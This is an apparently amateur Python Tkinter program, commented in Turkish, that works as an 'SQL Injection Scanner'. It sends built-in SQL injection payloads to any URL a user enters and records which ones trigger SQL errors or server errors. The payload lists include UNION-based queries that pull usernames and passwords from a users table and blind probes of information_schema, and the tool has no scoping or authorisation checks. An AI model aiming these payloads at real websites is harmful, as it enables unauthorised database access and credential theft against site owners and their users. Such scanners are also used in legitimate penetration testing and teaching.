import tkinter as tk
from tkinter import messagebox
import requests  # HTTP istekleri göndermek
import re  # URL'nin geçerli olup olmadığını kontrol etmek için regex
import json  # Sonuçları JSON formatında kaydetmek
import threading  # Paralel işlemler için threading
from datetime import datetime  # Zaman damgası eklemek için

def is_valid_url(url):
    """URL'nin geçerli olup olmadığını kontrol eder."""
    regex = re.compile(
        r'^(https?:\/\/)?'  # http:// veya https://
        r'((([a-zA-Z\d]([a-zA-Z\d-]*[a-zA-Z\d])*)\.)+[a-zA-Z]{2,}|'  # domain...
        r'localhost|'  # ...veya localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|'  # ...veya IPv4...
        r'\[([a-fA-F\d:.]+)\])'  # ...veya IPv6
        r'(:\d+)?(\/[-a-zA-Z\d%_.~+]*)*'  # port ve path
        r'(\?[;&a-zA-Z\d%_.~+=-]*)?'  # query string
        r'(\#[-a-zA-Z\d_]*)?$', re.IGNORECASE)
    return re.match(regex, url) is not None

def test_sql_injection(url, payload):
    """SQL Injection testi için verilen URL üzerinde payload'ları test eder."""
    try:
        test_url = f"{url}?input={payload}"   # URL'ye SQL payload'ı ekler
        response = requests.get(test_url, timeout=5)  # HTTP GET isteği gönderir
       # Eğer "SQL syntax" hatası metin içerisinde varsa veya HTTP durumu 500 (Sunucu hatası) ise
        if "SQL syntax" in response.text or response.status_code == 500:
           # SQL Injection açık olduğu kabul edilerek sonuç döndürülür
            return {"payload": payload, "status": "vulnerable", "url": test_url, "status_code": response.status_code}  # Test edilen payload
        else:
             # Eğer SQL hatası ya da sunucu hatası yoksa, güvenli kabul edilir
            return {"payload": payload, "status": "safe", "url": test_url, "status_code": response.status_code}  # Test edilen payload
    except requests.RequestException as e:
        return {"payload": payload, "status": "error", "url": url, "error": str(e)}

def save_results_to_json(results):
    """Test sonuçlarını JSON dosyasına kaydeder."""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")   # Zaman damgası oluşturur
    filename = f"test_results_{timestamp}.json"  # Dosya adı zaman damgasıyla oluşturulur
    with open(filename, "w") as file:    # Dosya açılır
        json.dump(results, file, indent=4)    # Sonuçlar JSON formatında yazılır
    return filename

def run_tests(url, payloads):
    """Aynı anda birden fazla URL üzerinde SQL Injection testi yapar."""
    results = []  # Sonuçları tutacak liste
    threads = []  # Thread'leri tutacak liste

    def test_and_append(payload):
        result = test_sql_injection(url, payload)  # Payload ile test yapılır
        results.append(result)  # Test sonucu listeye eklenir

    for payload in payloads:    # Her payload için paralel bir thread oluşturulur
        thread = threading.Thread(target=test_and_append, args=(payload,))
        threads.append(thread)   # Thread listeye eklenir.
        thread.start()  # Thread başlatılır.

    # Tüm thread'ler bitene kadar bekle.
    for thread in threads:
        thread.join()

    return results  #Sonuçları döndürür.

def gui_run_tests():
    """GUI'de SQL Injection testlerini başlatır ve sonuçları gösterir."""
    url = url_entry.get()  #Kullanıcıdan URL alır.
    if not is_valid_url(url):  #URL geçerli mi diye kontrol eder.
        messagebox.showerror("Hata", "Geçerli bir URL girin!")  #Hata mesajı verir.
        return

    level = test_level.get()  #Test seviyesini alır.
    payloads = basic_payloads if level == "basic" else advanced_payloads #Seviyeye göre payload seçimi.

    messagebox.showinfo("Bilgi", f"{level.capitalize()} seviyesinde testler başlatılıyor...")  #Bilgilendirme mesajı
    results = run_tests(url, payloads)  #testi başlatır.
 
    # Sonuçları kaydet
    json_file = save_results_to_json(results)

    # GUI'de sonuçları görüntüle
    result_text = "\n".join([f"Payload: {r['payload']}, Status: {r['status']}" for r in results])
    result_text += f"\n\nSonuçlar {json_file} dosyasına kaydedildi."
    messagebox.showinfo("Test Sonuçları", result_text)  #Sonuçları mesaj olarak  gösterir.

# Payload listeleri
basic_payloads = [
    "' OR 1=1 --",
    "' UNION SELECT null, null --",
    "1' OR '1'='1"
]

advanced_payloads = [
    "' AND 1=2 UNION SELECT null, version() --",
    "' AND ascii(substring((SELECT table_name FROM information_schema.tables LIMIT 1), 1, 1)) > 64 --",
    "' UNION ALL SELECT null, null, null --",
    "' UNION SELECT username, password FROM users --"
]

# GUI oluşturma
root = tk.Tk()  # Tkinter penceresini başlatır. root, ana pencereyi temsil eder.
root.title("SQL Injection Scanner")  # Pencerenin başlığını "SQL Injection Scanner" olarak ayarlar.


frame = tk.Frame(root, padx=10, pady=10)  
# Ana pencere (root) içine bir çerçeve (frame) oluşturur. Bu çerçeveye içeriği yerleştireceğiz. 
# padx ve pady, çerçeveye dışarıdan gelecek olan boşlukları belirtir.

frame.pack(padx=10, pady=10)
# Çerçeveyi ekler ve sağa sola (x) ve yukarı aşağıya (y) 10 px boşluk bırakır.
url_label = tk.Label(frame, text="Test Edilecek URL:") 
 # "Test Edilecek URL:" yazısı için bir etiket (label) oluşturur.

url_label.grid(row=0, column=0, sticky="w")
# Etiketi (label) grid düzenine ekler, ilk satır (row=0), ilk sütun (column=0), 
# ve "w" ile sola hizalar.

url_entry = tk.Entry(frame, width=50)
# Kullanıcının URL girmesi için bir metin kutusu (entry) oluşturur. Genişliği 50 karakter.
url_entry.grid(row=0, column=1, pady=5)
# Metin kutusunu grid düzenine ekler, 0. satırda ve 1. sütunda. 
# Ayrıca alt kısmında 5 px boşluk bırakır.
test_level_label = tk.Label(frame, text="Test Seviyesi:")
# "Test Seviyesi:" yazısını gösterecek bir etiket (label) oluşturur.
test_level_label.grid(row=1, column=0, sticky="w")
# Etiketi grid düzenine ekler, 1. satırda ve 0. sütunda, ve sola hizalar.
test_level = tk.StringVar(value="basic")
# Test seviyesini tutacak bir StringVar değişkeni oluşturur. Varsayılan değer "basic" olarak ayarlanır.
basic_radio = tk.Radiobutton(frame, text="Temel", variable=test_level, value="basic")
# Temel test seviyesi için bir radiobutton oluşturur. Seçildiğinde test_level değişkenine "basic" değeri atanır.
basic_radio.grid(row=1, column=1, sticky="w")
# Radiobutton'u grid düzenine ekler, 1. satırda ve 1. sütunda, ve sola hizalar.
advanced_radio = tk.Radiobutton(frame, text="İleri", variable=test_level, value="advanced")
# İleri seviye test için bir radiobutton oluşturur. Seçildiğinde test_level değişkenine "advanced" değeri atanır.
advanced_radio.grid(row=2, column=1, sticky="w")
# Radiobutton'u grid düzenine ekler, 2. satırda ve 1. sütunda, ve sola hizalar.
run_button = tk.Button(frame, text="Test Başlat", command=gui_run_tests)
# "Test Başlat" metniyle bir buton oluşturur. Tıklandığında gui_run_tests fonksiyonu çalıştırılır.
run_button.grid(row=3, column=0, columnspan=2, pady=10)
# Butonu grid düzenine ekler, 3. satırda ve tüm iki sütunda (columnspan=2), 
# ayrıca alt kısmında 10 px boşluk bırakır.
root.mainloop()
# Tkinter uygulamasının ana döngüsünü başlatır. Pencere açık kalır ve kullanıcı etkileşimlerini bekler.
